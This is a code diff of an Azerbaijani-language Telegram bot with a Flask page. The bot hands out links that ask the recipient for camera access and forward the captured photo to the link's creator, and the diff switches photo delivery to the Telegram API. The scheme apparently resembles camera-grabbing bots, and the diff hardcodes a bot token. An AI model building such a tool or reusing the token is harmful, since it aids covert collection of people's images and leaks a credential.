@@ -4,10 +4,11 @@ import logging
 from datetime import datetime
 from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup
 from telegram.ext import Application, CommandHandler, MessageHandler, filters, ContextTypes
-from flask import Flask, render_template_string, request, jsonify
+from flask import Flask, request, jsonify
 from threading import Thread
 import base64
 import uuid
+import requests
 
 # Logging setup
 logging.basicConfig(
@@ -17,8 +18,8 @@ logging.basicConfig(
 logger = logging.getLogger(__name__)
 
 # Configuration
-BOT_TOKEN = "8069501498:AAExx7_1QkbFWLAkBcWZF7JNMKrpIo0uWCg"
-WEBHOOK_URL = "https://camera-cjl1.onrender.com/"
+BOT_TOKEN = "8069501498:AAExx7_1QkbFWLAkBcWZF7JNMKrpIo0uWCg"  # DƏYIŞDIR!
+WEBHOOK_URL = "https://camera-cjl1.onrender.com/"  # DƏYIŞDIR!
 FLASK_PORT = 5000
 
 # Storage file (JSON)
@@ -83,7 +84,7 @@ class CameraBot:
 🎉 Xoş gəldiniz!
 
 📱 **Sizin Özəl Linkınız:**
-{share_link}
+`{share_link}`
 
 💡 **Bu linki başqasına göndərin:**
 - Onlar linki açsın
@@ -91,12 +92,11 @@ class CameraBot:
 - Şəkil çəksin
 - Şəkil sizə gələcək! ✅
 
-🔗 Linki kopylamaq üçün aşağıdakı düyməyə kliklə:
+🔗 Linki test et:
 """
         
         keyboard = [
             [InlineKeyboardButton("📋 Linki Kopyala", url=share_link)],
-            [InlineKeyboardButton("📸 Çəkilən Şəkillərim", callback_data='my_photos')]
         ]
         reply_markup = InlineKeyboardMarkup(keyboard)
         
@@ -150,10 +150,6 @@ def index():
                    border-left: 4px solid #667eea; }
             .info h3 { color: #667eea; margin-bottom: 10px; }
             .info p { color: #555; margin: 8px 0; font-size: 14px; }
-            .step { margin: 15px 0; padding: 12px; background: #f9fafb; border-radius: 6px; }
-            .step strong { color: #667eea; }
-            a { color: #667eea; text-decoration: none; font-weight: 600; }
-            a:hover { text-decoration: underline; }
         </style>
     </head>
     <body>
@@ -162,28 +158,16 @@ def index():
             
             <div class="info">
                 <h3>✅ Bot Çalışır!</h3>
-                <p>Telegram-da @CameraPhotoBot-u tapıb /start yazın</p>
+                <p>Telegram-da bot-a /start yazın</p>
             </div>
             
             <div class="info">
                 <h3>🎯 Necə İşləyir?</h3>
-                <div class="step">
-                    <strong>1️⃣ Adım:</strong> Telegram-da bot-a /start yazıb özəl linkini al
-                </div>
-                <div class="step">
-                    <strong>2️⃣ Adım:</strong> Linki başqasına göndər
-                </div>
-                <div class="step">
-                    <strong>3️⃣ Adım:</strong> O link-ə daxil olub şəkil çəksin
-                </div>
-                <div class="step">
-                    <strong>4️⃣ Adım:</strong> Şəkil sənə gələcək! ✅
-                </div>
+                <p>1. /start yazıb özəl linkini al</p>
+                <p>2. Linki başqasına göndər</p>
+                <p>3. O link-ə daxıl olub şəkil çəksin</p>
+                <p>4. Şəkil sənə gələcək! ✅</p>
             </div>
-            
-            <p style="text-align: center; color: #999; margin-top: 30px; font-size: 12px;">
-                Bot v2.0 - Global Paylaşma Sistemi
-            </p>
         </div>
     </body>
     </html>
@@ -338,7 +322,7 @@ def share():
                     startBtn.style.display = 'none';
                     cameraContent.classList.add('active');
                     stepIndicator.textContent = '1/3';
-                    showMessage('✅ Kamera hazır. Şəkil çəkə bilərsən');
+                    showMessage('✅ Kamera hazır');
                 }} catch (err) {{
                     showMessage('❌ Kamera icazəsi rədd edildi!', 'error');
                 }}
@@ -354,7 +338,7 @@ def share():
                 captureSection.style.display = 'none';
                 previewSection.style.display = 'block';
                 stepIndicator.textContent = '2/3';
-                showMessage('✅ Şəkil çəkildi. Göndərmə üçün hazır');
+                showMessage('✅ Şəkil çəkildi');
             }});
             
             cancelBtn.addEventListener('click', () => {{
@@ -397,14 +381,14 @@ def share():
                         startBtn.textContent = '✅ Tamamlandı!';
                         startBtn.disabled = true;
                         stepIndicator.textContent = '3/3';
-                        showMessage('✅ Şəkil uğurla göndərildi!');
+                        showMessage('✅ Şəkil göndərildi!');
                     }} else {{
-                        showMessage('❌ Xəta: ' + data.error, 'error');
+                        showMessage('❌ Xəta: ' + (data.error || 'Naməlum xəta'), 'error');
                         loader.classList.remove('active');
                         sendBtn.disabled = false;
                     }}
                 }} catch (err) {{
-                    showMessage('❌ Göndərmə xətası: ' + err.message, 'error');
+                    showMessage('❌ Xəta: ' + err.message, 'error');
                     loader.classList.remove('active');
                     sendBtn.disabled = false;
                 }}
@@ -418,7 +402,7 @@ def share():
     return html
 
 @app.route('/upload-photo', methods=['POST'])
-async def upload_photo():
+def upload_photo():
     """Şəkili qəbul et və bot-a göndər"""
     try:
         data = request.get_json()
@@ -447,21 +431,27 @@ async def upload_photo():
         }
         save_photos(photos)
         
-        # Bot-a göndər
+        # Bot-a göndər (requests ilə - async yoxsuz)
         try:
-            bot = camera_bot.app.bot
-            
             # Base64-dən binary-ə çevir
             photo_bytes = base64.b64decode(photo_base64.split(',')[1])
             
-            await bot.send_photo(
-                chat_id=int(user_id),
-                photo=photo_bytes,
-                caption=f"📸 Yeni Şəkil Alındı!\n⏰ {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}"
-            )
+            # Telegram Bot API-ə POST request et
+            url = f"https://api.telegram.org/bot{BOT_TOKEN}/sendPhoto"
+            files = {'photo': ('photo.jpg', photo_bytes, 'image/jpeg')}
+            data_send = {
+                'chat_id': user_id,
+                'caption': f"📸 Yeni Şəkil Alındı!\n⏰ {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}"
+            }
             
-            logger.info(f"Photo sent to user {user_id}")
-            return jsonify({'success': True, 'message': 'Şəkil göndərildi'})
+            response = requests.post(url, files=files, data=data_send)
+            
+            if response.status_code == 200:
+                logger.info(f"Photo sent to user {user_id}")
+                return jsonify({'success': True, 'message': 'Şəkil göndərildi'})
+            else:
+                logger.error(f"Telegram API error: {response.text}")
+                return jsonify({'success': False, 'error': 'Telegram API xətası'}), 500
         
         except Exception as e:
             logger.error(f"Error sending photo: {str(e)}")
@@ -473,7 +463,7 @@ async def upload_photo():
 
 def run_flask():
     """Flask-ı fonda çalışdır"""
-    app.run(host='0.0.0.0', port=FLASK_PORT, debug=False)
+    app.run(host='0.0.0.0', port=FLASK_PORT, debug=False, use_reloader=False)
 
 def main():
     """Əsas funksiya"""
